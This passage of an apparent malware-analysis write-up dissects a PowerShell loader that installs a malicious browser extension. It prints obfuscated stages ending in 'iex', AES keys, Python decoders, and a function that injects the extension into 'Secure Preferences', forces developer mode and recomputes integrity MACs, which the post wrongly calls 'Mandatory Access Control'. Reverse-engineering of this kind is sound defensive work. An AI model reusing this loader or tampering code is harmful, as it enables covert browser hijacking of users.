+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">F6lPa</span> <span class="o">=</span> <span class="o">$</span><span class="n">zGfxA</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="s2">&#34;!&#34;</span><span class="p">,</span> <span class="s2">&#34;l&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="s2">&#34;*&#34;</span><span class="p">,</span> <span class="s2">&#34;d&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="s2">&#34;`&#34;&#34;, &#34;</span><span class="n">T</span><span class="s2">&#34;).Replace(&#34;</span><span class="s1">&#39;&#34;, &#34;H&#34;).Replace(&#34;;&#34;, &#34;F&#34;) // changing a lot of chareters of a base64</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">YgKk7</span> <span class="o">=</span> <span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="o">$</span><span class="n">F6lPa</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">SlLVN</span> <span class="o">=</span> <span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">([</span><span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">Encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="o">.</span><span class="n">GetString</span><span class="p">(</span><span class="o">$</span><span class="n">YgKk7</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">Encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="o">.</span><span class="n">GetString</span><span class="p">(</span><span class="o">$</span><span class="n">SlLVN</span><span class="p">)</span> <span class="o">|</span> <span class="n">iex</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using Python, lets decoded the domain hosting the next script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Original obfuscated string </span>
+</span></span><span class="line"><span class="cl"><span class="n">uPlik</span> <span class="o">=</span> <span class="s2">&#34;DhsMWR4bDQFFIRMfGQc5RVwbD0UMXQMeGgg4EEUkPSceLAMoWl8TBSo@ADIBM1IEGlwQWF0TXQcYKjlf&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Replacing &#39;@&#39; with &#39;a&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LXxNl</span> <span class="o">=</span> <span class="n">uPlik</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;@&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Base64 decode and XOR with 106</span>
+</span></span><span class="line"><span class="cl"><span class="n">decoded_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">LXxNl</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">xor_106</span> <span class="o">=</span> <span class="n">bytes</span><span class="p">([</span><span class="n">b</span> <span class="o">^</span> <span class="mi">106</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">decoded_bytes</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Convert to string and replace &#39;@&#39; with &#39;a&#39; again</span>
+</span></span><span class="line"><span class="cl"><span class="n">ascii_str</span> <span class="o">=</span> <span class="n">xor_106</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;@&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Base64 decode again</span>
+</span></span><span class="line"><span class="cl"><span class="n">second_base64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">ascii_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># XOR with cyclic key</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">30</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">219</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">key_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">final_bytes</span> <span class="o">=</span> <span class="n">bytes</span><span class="p">([</span><span class="n">b</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_len</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">enumerate</span><span class="p">(</span><span class="n">second_base64</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Convert to string </span>
+</span></span><span class="line"><span class="cl"><span class="n">final_url</span> <span class="o">=</span> <span class="n">final_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Decoded URL:&#34;</span><span class="p">,</span> <span class="n">final_url</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And we have the URL:
+<img src="/static/Extension/Pasted image 20250524131615.png" alt="drawing" width="1000"/></p>
+<p>This URL contained a massive Base64 string that, when decoded, revealed another decoding and decryption routine using AES.</p>
+<img src="/static/Extension/Pasted image 20250524135528.png" alt="drawing" width="1000"/>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$AUJKY = &#34;HUGE_BASE64&#34;
+</span></span><span class="line"><span class="cl">$vclPn = [Convert]::FromBase64String($AUJKY)
+</span></span><span class="line"><span class="cl">$xoL70 = [Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString($vclPn))
+</span></span><span class="line"><span class="cl">$RhAUo = [System.Text.Encoding]::ASCII.GetString($xoL70).Replace(&#34;%&#34;, &#34;d&#34;).Replace(&#34;`$&#34;, &#34;a&#34;).Replace(&#34;!&#34;, &#34;b&#34;).Replace(&#34;@&#34;, &#34;B&#34;)
+</span></span><span class="line"><span class="cl">$skiUV = [Convert]::FromBase64String($RhAUo)
+</span></span><span class="line"><span class="cl">$kqB9Mm=[Convert]::FromBase64String(&#39;JgtrU4CqeEdQRIkU06d+iw==&#39;);
+</span></span><span class="line"><span class="cl">$TyZDj=[Convert]::FromBase64String(&#39;07vOZJ8e04PG22qE6cVEDciVdTaI6E1J8NwudfkswXA=&#39;);
+</span></span><span class="line"><span class="cl">$HjBUi = New-Object System.Security.Cryptography.AesManaged
+</span></span><span class="line"><span class="cl">$HjBUi.Key = $TyZDj
+</span></span><span class="line"><span class="cl">$HjBUi.IV = $kqB9Mm
+</span></span><span class="line"><span class="cl">$HjBUi.Mode = [System.Security.Cryptography.CipherMode]::CBC
+</span></span><span class="line"><span class="cl">$HjBUi.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+</span></span><span class="line"><span class="cl">$HOfuc = $HjBUi.CreateDecryptor();
+</span></span><span class="line"><span class="cl">$jeFIav = New-Object System.IO.MemoryStream
+</span></span><span class="line"><span class="cl">$q3gnLL = New-Object System.Security.Cryptography.CryptoStream($jeFIav, $HOfuc, [System.Security.Cryptography.CryptoStreamMode]::Write)
+</span></span><span class="line"><span class="cl">$q3gnLL.Write($skiUV, 0, $skiUV.Length)
+</span></span><span class="line"><span class="cl">$q3gnLL.FlushFinalBlock()
+</span></span><span class="line"><span class="cl">$K7f50 = $jeFIav.ToArray()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$H52LE = [byte[]](211, 187, 206, 100, 159);
+</span></span><span class="line"><span class="cl">$qPA7L = 0;
+</span></span><span class="line"><span class="cl">$N2E6N = $K7f50 | ForEach-Object {
+</span></span><span class="line"><span class="cl">$_ -bxor $H52LE[$qPA7L++];
+</span></span><span class="line"><span class="cl">if ($qPA7L -ge $H52LE.Length) {
+</span></span><span class="line"><span class="cl">$qPA7L = 0
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[System.Text.Encoding]::ASCII.GetString($N2E6N) | iex
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lets again create another python script to do this for us:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">base64</span>
+</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">Crypto</span><span class="o">.</span><span class="n">Cipher</span> <span class="n">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode_powershell_style</span><span class="p">(</span><span class="n">encoded_au_jky_base64</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># base64 decode do $AUJKY</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vclPn</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encoded_au_jky_base64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># decode to ASCII and decode base64 again</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ascii_str</span> <span class="o">=</span> <span class="n">vclPn</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xoL70</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">ascii_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Replacing caracteres</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decoded_str</span> <span class="o">=</span> <span class="n">xoL70</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decoded_str</span> <span class="o">=</span> <span class="n">decoded_str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;%&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;`$&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="p">,</span> <span class="s1">&#39;B&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># base64 decode </span>
+</span></span><span class="line"><span class="cl">    <span class="n">skiUV</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">decoded_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># definy IV key para AES</span>
+</span></span><span class="line"><span class="cl">    <span class="n">kqB9Mm</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;JgtrU4CqeEdQRIkU06d+iw==&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">TyZDj</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;07vOZJ8e04PG22qE6cVEDciVdTaI6E1J8NwudfkswXA=&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># config AES CBC PKCS7</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">TyZDj</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="o">=</span><span class="n">kqB9Mm</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># decrypt</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">skiUV</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># padding PKCS7</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pad_len</span> <span class="o">=</span> <span class="n">decrypted</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypted</span><span class="p">[:</span><span class="o">-</span><span class="n">pad_len</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># XOR byte to byte</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xor_key</span> <span class="o">=</span> <span class="n">bytes</span><span class="p">([</span><span class="mi">211</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">206</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">159</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xor_result</span> <span class="o">=</span> <span class="n">bytearray</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">enumerate</span><span class="p">(</span><span class="n">decrypted</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">xor_result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">len</span><span class="p">(</span><span class="n">xor_key</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># convert to ASCII</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">xor_result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;replace&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">au_jky</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;Base64 of $AUJKY: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">decode_powershell_style</span><span class="p">(</span><span class="n">au_jky</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Resultado decodificado:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finnaly, the last script:</p>
+<img src="/static/Extension/Pasted image 20250524142952.png" alt="drawing" width="1000"/>
+<p>It&rsquo;s a very big script. What it mostly does is decode each Base64 string (which represents the content of the extension&rsquo;s files) and add it to its respective file. But the question is: How does it add the extension to the browser?</p>
+<img src="/static/Extension/Pasted image 20250528223241.png" alt="drawing" width="1000"/>
+<p>The following deobfuscated function reveals that the extension was installed by modifying the &lsquo;Secure Preferences&rsquo; file while enforcing Developer Mode in the browser:</p>
+<p>Note that MAC (Mandatory Access Control) is recalculated to trick the browser into accepting malicious changes. Without this step, the browser&rsquo;s integrity check would fail!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function Modify-BrowserSettings
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    param(
+</span></span><span class="line"><span class="cl">        $Base64Settings,
+</span></span><span class="line"><span class="cl">        $ExtensionName,
+</span></span><span class="line"><span class="cl">        $ExtensionPath,
+</span></span><span class="line"><span class="cl">        $BrowserProfilesDirectory,
+</span></span><span class="line"><span class="cl">        $BrowserName,
+</span></span><span class="line"><span class="cl">        $UserSID,
+</span></span><span class="line"><span class="cl">        $HexString,
+</span></span><span class="line"><span class="cl">        $SettingsKey = &#34;settings&#34;
+</span></span><span class="line"><span class="cl">    )
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    if (Test-Path $BrowserProfilesDirectory -PathType Container)
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        $BrowserExecutablePath = Get-BrowserExecutablePath $BrowserName
+</span></span><span class="line"><span class="cl">        $CurrentUsername = $Env:USERNAME
+</span></span><span class="line"><span class="cl">        $LocalUser = Get-LocalUser -Name $CurrentUsername | Select-Object SID
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        if ($LocalUser)
+</span></span><span class="line"><span class="cl">        {
+</span></span><span class="line"><span class="cl">            $UserSID = $LocalUser.SID.ToString().Substring(0, $LocalUser.SID.ToString().Length - 5)
+</span></span><span class="line"><span class="cl">            $ProfileDirectories = Get-ChildItem -Path $BrowserProfilesDirectory -Directory | 
+</span></span><span class="line"><span class="cl">                Where-Object { $_.Name -like &#34;Default&#34; -or $_.Name -like &#34;Profile*&#34; }
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            if ($ProfileDirectories.Count -gt 0)
+</span></span><span class="line"><span class="cl">            {
+</span></span><span class="line"><span class="cl">                foreach ($ProfileDirectory in $ProfileDirectories)
+</span></span><span class="line"><span class="cl">                {
+</span></span><span class="line"><span class="cl">                    $SecurePreferencesPath = &#34;$BrowserProfilesDirectory\$($ProfileDirectory.Name)\Secure Preferences&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    $JsonData = Get-Content -Raw -Path $SecurePreferencesPath -Encoding UTF8 | ConvertFrom-Json
+</span></span><span class="line"><span class="cl">                    $CryptoKey = Convert-HexStringToKey -HexString $HexString
+</span></span><span class="line"><span class="cl">                    $ExtensionSettings = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Base64Settings)) | ConvertFrom-Json)
+</span></span><span class="line"><span class="cl">                    $ExtensionSettings.Path = $ExtensionPath
+</span></span><span class="line"><span class="cl">                    
+</span></span><span class="line"><span class="cl">                    # Add extension settings
+</span></span><span class="line"><span class="cl">                    if ($JsonData.extensions.$SettingsKey | Get-Member -Name $ExtensionName -MemberType Property -ErrorAction SilentlyContinue)
+</span></span><span class="line"><span class="cl">                    {
+</span></span><span class="line"><span class="cl">                        $JsonData.extensions.$SettingsKey.$ExtensionName = $ExtensionSettings
+</span></span><span class="line"><span class="cl">                    }
+</span></span><span class="line"><span class="cl">                    else
+</span></span><span class="line"><span class="cl">                    {
+</span></span><span class="line"><span class="cl">                        $JsonData.extensions.$SettingsKey | Add-Member -MemberType NoteProperty -Name $ExtensionName -Value $ExtensionSettings -Force
+</span></span><span class="line"><span class="cl">                    }
+</span></span><span class="line"><span class="cl">                    
+</span></span><span class="line"><span class="cl">                    # Update MAC for extension settings
+</span></span><span class="line"><span class="cl">                    if ($JsonData.protection.macs.extensions.$SettingsKey | Get-Member -Name $ExtensionName -MemberType Property -ErrorAction SilentlyContinue)
+</span></span><span class="line"><span class="cl">                    {
+</span></span><span class="line"><span class="cl">                        $JsonData.protection.macs.extensions.$SettingsKey.$ExtensionName = 
+</span></span><span class="line"><span class="cl">                            Calculate-MAC $CryptoKey ($UserSID + &#34;extensions.&#34; + $SettingsKey + &#34;.&#34; + $ExtensionName + ($ExtensionSettings | ConvertTo-Json -Compress -Depth 100))
+</span></span><span class="line"><span class="cl">                    }
+</span></span><span class="line"><span class="cl">                    else
+</span></span><span class="line"><span class="cl">                    {
+</span></span><span class="line"><span class="cl">                        $JsonData.protection.macs.extensions.$SettingsKey | Add-Member -MemberType NoteProperty -Name $ExtensionName -Force -Value (
+</span></span><span class="line"><span class="cl">                            Calculate-MAC $CryptoKey ($UserSID + &#34;extensions.&#34; + $SettingsKey + &#34;.&#34; + $ExtensionName + ($ExtensionSettings | ConvertTo-Json -Compress -Depth 100))
+</span></span><span class="line"><span class="cl">                    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    # Force enable developer mode
+</span></span><span class="line"><span class="cl">                    if (-not $JsonData.extensions.ui)
+</span></span><span class="line"><span class="cl">                    {
+</span></span><span class="line"><span class="cl">                        $JsonData.extensions | Add-Member -MemberType NoteProperty -Name &#34;ui&#34; -Value @{ &#34;developer_mode&#34; = $true } -Force
+</span></span><span class="line"><span class="cl">                    }
+</span></span><span class="line"><span class="cl">                    else
+</span></span><span class="line"><span class="cl">                    {
+</span></span><span class="line"><span class="cl">                        $JsonData.extensions.ui = @{ &#34;developer_mode&#34; = $true }
+</span></span><span class="line"><span class="cl">                    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    # Update MACs for security validation
+</span></span><span class="line"><span class="cl">                    $JsonData.protection.macs.extensions.ui.developer_mode = 
+</span></span><span class="line"><span class="cl">                        Calculate-MAC $CryptoKey ($UserSID + &#34;extensions.ui.developer_modetrue&#34;)
+</span></span><span class="line"><span class="cl">                    $JsonData.protection.super_mac = 
+</span></span><span class="line"><span class="cl">                        Calculate-MAC $CryptoKey ($UserSID + ($JsonData.protection.macs | ConvertTo-Json -Compress -Depth 100))
+</span></span><span class="line"><span class="cl">                    
+</span></span><span class="line"><span class="cl">                    # Save changes
